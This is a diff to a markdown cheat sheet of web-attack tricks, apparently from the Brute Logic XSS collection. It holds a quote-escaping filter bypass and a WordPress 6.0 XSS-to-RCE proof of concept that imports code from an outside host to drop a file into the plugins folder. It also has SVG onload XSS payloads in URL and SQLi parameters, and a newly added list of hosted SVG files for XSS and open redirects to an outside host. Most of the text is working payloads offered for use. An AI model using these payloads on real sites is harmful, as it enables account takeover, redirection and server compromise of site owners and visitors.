@@ -1,7 +1,7 @@
 # Brute Logic Tricks
 - To avoid the %27 being escaped by \ we can use any byte from %A1 to %FE to be bundled with single quote in order to trick the filter.
 
-- WP 6.0 #XSS to #RCE PoC
+- WP 6.0 XSS to RCE PoC
   It creates brute.txt file in /wp-content/plugins folder, use it instead of alert(1) in your regular XSS PoC.
   Example: 
   import('//X55.is/wp')
@@ -38,6 +38,24 @@
      ?url=data:,<svg/onload=alert(1)>
   3. SQLi (error-based)
      Example: ?id='<svg/onload=alert(1)>\
+
+- Brute SVG Collection
+  1. XSS (no image)
+     Example:
+     https://brutelogic.com.br/poc.svg
+  2. XSS (valid image)
+     Example:
+     https://brutelogic.com.br/brute.svg
+  3. Redirect (default)
+     Example: 
+     https://brutelogic.com.br/redir.svg
+  4. Redirect (custom)
+     Example:
+     https://brutelogic.com.br/redir.svg?url=//X55.is
+  5.Redirect (custom + warning)\
+    Example:
+    https://brutelogic.com.br/redir.svg?url=//X55.is&w=1
+
 
 
 
